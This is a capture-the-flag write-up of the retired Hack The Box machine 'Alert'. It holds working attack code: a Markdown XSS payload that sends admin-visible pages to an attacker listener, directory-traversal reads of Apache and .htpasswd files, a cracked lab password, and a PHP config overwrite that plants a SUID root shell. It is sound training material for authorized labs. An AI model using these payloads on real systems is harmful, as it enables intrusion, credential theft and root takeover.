---
title: "Hack The Box — Alert"
summary: "Alert chains Markdown XSS with an internal file-read flaw to recover an SSH password, then abuses a writable PHP configuration loaded by root."
platform: "Hack The Box"
contentType: "machine"
publicationPolicy: "retired"
difficulty: "Easy"
os: "Linux"
solvedAt: 2026-11-27
publishedAt: 2026-11-27
tags:
  - web-enumeration
  - markdown-xss
  - blind-xss
  - directory-traversal
  - arbitrary-file-read
  - password-cracking
  - ssh
  - writable-php-configuration
  - privilege-escalation
tools:
  - Nmap
  - ffuf
  - Python
  - Hashcat
cves: []
htbUrl: "https://app.hackthebox.com/machines/Alert"
cover: "/images/writeups/hackthebox/machines/alert/cover.png"
coverAlt: "Hack The Box Alert machine artwork with a red warning beacon inside a green circle"
featured: false
draft: false
---

> This write-up covers an authorized Hack The Box lab. The [HTB Alert profile](https://app.hackthebox.com/machines/Alert) displays its unlocked write-ups, and the [recorded retirement date is 22 March 2025](https://0xdf.gitlab.io/2025/03/22/htb-alert.html). This meets the [Hack The Box publication rule](https://help.hackthebox.com/en/articles/5188925-streaming-writeups-walkthrough-guidelines). Flag values and session-specific IP addresses are omitted. The lab hash and password are included because they are necessary to reproduce the attack path.

## Executive summary

Alert's Markdown viewer renders uploaded HTML without neutralizing JavaScript. A shared Markdown link sent through the contact form is opened by an administrator bot, so the script runs in the site's origin. The bot can access a loopback-only `messages.php` page; that page concatenates an unsanitized `file` parameter into a filesystem path. Reading the Apache configuration reveals the Basic Auth password file, and cracking its `$apr1$` hash gives SSH access as `albert`. Locally, `albert` belongs to the `management` group, which can overwrite a PHP configuration included by a root-run monitor. That trust boundary gives code execution as root.

## Target information

| Item | Value |
| --- | --- |
| Target | Alert |
| Platform | Hack The Box |
| Difficulty | Easy |
| Operating system | Linux |
| Publication policy | Retired, 22 March 2025; [HTB profile](https://app.hackthebox.com/machines/Alert) |
| Solved | 27 November 2026 |
| Main weaknesses | Markdown XSS, loopback-only page reached through an admin browser, arbitrary file read, writable root-executed PHP configuration |

Start your instance and connect Kali to the HTB VPN. Set `TARGET` to the IP assigned to *your* machine. `LHOST` must be the address of your Kali VPN interface, so check that `tun0` is the correct interface before using it in a payload.

```bash
TARGET='YOUR_TARGET_IP'
LHOST=$(ip -4 -o addr show tun0 | awk '{print $4}' | cut -d/ -f1)
printf 'Target: %s\nKali VPN IP: %s\n' "$TARGET" "$LHOST"
echo "$TARGET alert.htb statistics.alert.htb" | sudo tee -a /etc/hosts
```

## Enumeration

### Ports and web application

Scan all TCP ports with service and default-script detection:

```bash
nmap "$TARGET" -T5 -sVC -p-
```

The scan identified SSH on `22/tcp`, Apache HTTP on `80/tcp`, and a filtered `12227/tcp`. Apache redirected the IP-based request to `http://alert.htb/`. If the fast scan reports a retransmission warning, verify the relevant ports with a slower scan. The filtered port did not contribute to this attack path.

Opening `http://alert.htb/` shows a **Markdown Viewer** that accepts `.md` uploads and generates a **Share Markdown** link. The navigation also offers **Contact Us**. The **About Us** text says an administrator reviews contact messages, which makes a submitted share link a plausible way to reach a privileged browser.

Optional content and virtual-host enumeration makes two later observations easier to explain:

```bash
feroxbuster -u http://alert.htb/ -x php
ffuf -u "http://$TARGET/" -H 'Host: FUZZ.alert.htb' \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
  -mc all -ac
```

`feroxbuster` finds `/messages.php`, which appears empty from Kali. The `statistics` virtual host responds differently and asks for HTTP Basic authentication. The empty page suggests an access check, while the `401` response points to a credential store worth locating. Neither observation alone grants access.

## Initial access

### Confirm Markdown XSS

Create a small Markdown file:

```bash
cat > test.md <<'EOF'
# Markdown XSS test
<script>alert(document.domain)</script>
EOF
```

Upload it through **Markdown Viewer** and select **View Markdown**. The JavaScript alert confirms that the Markdown renderer allows executable HTML. Use the application's **Share Markdown** link for the next step; the contact form needs a URL the administrator can open, not the contents of the Markdown file.

### Reach the internal message page through the admin browser

Start a listener on Kali in a separate terminal:

```bash
python3 -m http.server 8000
```

Build `read.md` with a path for the administrator's browser to request. Start with `/messages.php`:

```bash
TARGET_PATH='/messages.php'
cat > read.md <<EOF
# Shared Markdown
<script>
fetch('$TARGET_PATH')
  .then(response => response.text())
  .then(body => {
    const data = btoa(body)
      .replace(/\+/g, '-')
      .replace(/\//g, '_')
      .replace(/=+$/, '');
    new Image().src = 'http://$LHOST:8000/?d=' + data;
  });
</script>
EOF
```

Upload `read.md`, click **Share Markdown**, and immediately open the new link once to ensure it renders. Then paste that entire link into the **Your message** field on **Contact Us** and submit it with an email address. The site periodically removes uploaded Markdown files, so generate a fresh link if the shared URL returns `Error: Invalid file.`

The Python server records a request to `/?d=...`. A request from your own VPN IP only proves that *your* browser ran the script. Wait for a request from the target's IP to confirm the administrator bot executed it. Copy the value after `d=` and decode it:

```bash
python3 -c 'import base64,sys; print(base64.urlsafe_b64decode(sys.argv[1] + "===").decode())' 'PASTE_D_VALUE_HERE'
```

The admin's response lists a message under a link shaped like `messages.php?file=2024-03-10_15-48-34.txt`. That `file` parameter is the next lead. Rebuild `read.md` with each `TARGET_PATH` below, upload it again, and send its *new* share link through **Contact Us**:

| `TARGET_PATH` | What the response establishes |
| --- | --- |
| `/messages.php?file=../messages.php` | The PHP source uses `file_get_contents($directory . $file)` without constraining traversal. It also permits the message view only for loopback visitors. |
| `/messages.php?file=../../../../etc/apache2/sites-enabled/000-default.conf` | The Apache configuration names `statistics.alert.htb` and its `AuthUserFile`. |
| `/messages.php?file=../../../../var/www/statistics.alert.htb/.htpasswd` | The Basic Auth username and password hash. |

The `messages/` directory is below `/var/www/alert.htb/`; four `..` components reach the filesystem root. The XSS executes in the site's origin, so its `fetch()` call can read `/messages.php` as the administrator. The vulnerable PHP code then reads server-side files. This is **arbitrary file read via directory traversal**, not PHP code inclusion: `file_get_contents()` returns the target file's bytes rather than executing them.

### Crack the hash and log in

The decoded `.htpasswd` response is wrapped in `<pre>` tags. Save only the `username:hash` line to `hash.txt`:

```bash
printf '%s\n' 'albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/' > hash.txt
hashcat -m 1600 --username hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1600 --username hash.txt --show
```

If Kali only has `rockyou.txt.gz`, decompress it first. Hashcat mode `1600` is Apache `$apr1$` MD5. The recovered lab password is `manchesterunited`. Test it over SSH:

```bash
ssh albert@alert.htb
id
ls -l ~/user.txt
```

The account is `albert`, and `id` shows membership in the `management` group. The user flag can be read locally; its value is intentionally omitted here.

## Privilege escalation

Inspect files controlled by `management` and how the website monitor uses its configuration:

```bash
id
ls -l /opt/website-monitor/config/configuration.php
grep -n 'configuration.php' /opt/website-monitor/monitor.php
cat /opt/website-monitor/config/configuration.php
```

The configuration is owned by `root:management` with group-write permission. `monitor.php` includes `config/configuration.php`, so PHP statements added to that file run with the privileges of the process executing the monitor. The monitor runs as root. The original configuration only defines the monitor's `PATH` constant; preserve that definition so the monitor still works.

Overwrite the configuration with a short payload. The root-run PHP process will create a root-owned copy of Bash and set its SUID bit:

```bash
cat > /opt/website-monitor/config/configuration.php <<'PHP'
<?php
define('PATH', '/opt/website-monitor');
system('cp /bin/bash /opt/website-monitor/rootbash; chmod 4755 /opt/website-monitor/rootbash');
?>
PHP
```

Wait briefly, then check ownership and execute Bash with `-p`, which preserves the effective UID:

```bash
ls -l /opt/website-monitor/rootbash
/opt/website-monitor/rootbash -p
id
ls -l /root/root.txt
```

The successful file mode is `-rwsr-xr-x` with `root` as owner. In the resulting shell, `id` shows `euid=0(root)`, establishing root execution. The root flag value is omitted. If the configuration is restored before you inspect it, check whether the SUID copy was already created; the restoration does not undo a file already written outside the watched configuration directory.

After verifying the result, restore the original configuration if necessary and remove the SUID copy:

```bash
cat > /opt/website-monitor/config/configuration.php <<'PHP'
<?php
define('PATH', '/opt/website-monitor');
?>
PHP
rm /opt/website-monitor/rootbash
```

## What did not work

- Opening `/messages.php` directly from Kali returned an empty response because the page is restricted to loopback requests. The administrator's browser provided the required context.
- A callback from the Kali VPN IP, rather than from Alert, showed only that the XSS worked in the attacker's own browser. It did not prove the bot had read the protected page.
- An old **Share Markdown** URL eventually returned `Error: Invalid file.` Uploading the payload again and sending the fresh link resolved it.
- A SUID Bash copy created under `/tmp` was removed before it could be executed. Creating the copy under `/opt/website-monitor/` avoided that cleanup window.

## Attack path

1. Scan the host and discover SSH, Apache, the Markdown viewer, and the contact form.
2. Upload Markdown containing JavaScript and send its share link to the administrator.
3. Use the administrator's browser to read the loopback-only `messages.php` page.
4. Traverse through its `file` parameter to read the Apache configuration and `.htpasswd`.
5. Crack the `$apr1$` hash and log in as `albert` over SSH.
6. Use `management` write access to alter a PHP configuration included by a root process.
7. Execute a root-owned SUID Bash copy to obtain `euid=0`.

## Lessons learned

- An XSS finding becomes much more consequential when a privileged browser can access internal pages in the same origin. Test the browser's *effective reach*, not just cookie theft.
- Internal-only access controls do not make unsafe file paths safe. The `file` value still needs canonicalization and a strict allowlist inside `messages/`.
- Files included by privileged jobs must not be writable by lower-privilege groups. Review the complete include chain, not only the scheduled script's permissions.
- Callback source IPs, expired share links, and cleanup jobs can explain apparently inconsistent exploit results. Check those observations before changing the attack hypothesis.

## References

- [Hack The Box: streaming, write-up and walkthrough guidelines](https://help.hackthebox.com/en/articles/5188925-streaming-writeups-walkthrough-guidelines)
- [0xdf: Alert box information and technical analysis](https://0xdf.gitlab.io/2025/03/22/htb-alert.html)
- [PHP: `file_get_contents()`](https://www.php.net/manual/en/function.file-get-contents.php)
- [Hashcat example hashes: Apache `$apr1$` MD5](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [GNU Bash manual: invoking Bash with `-p`](https://www.gnu.org/software/bash/manual/html_node/Invoking-Bash.html)
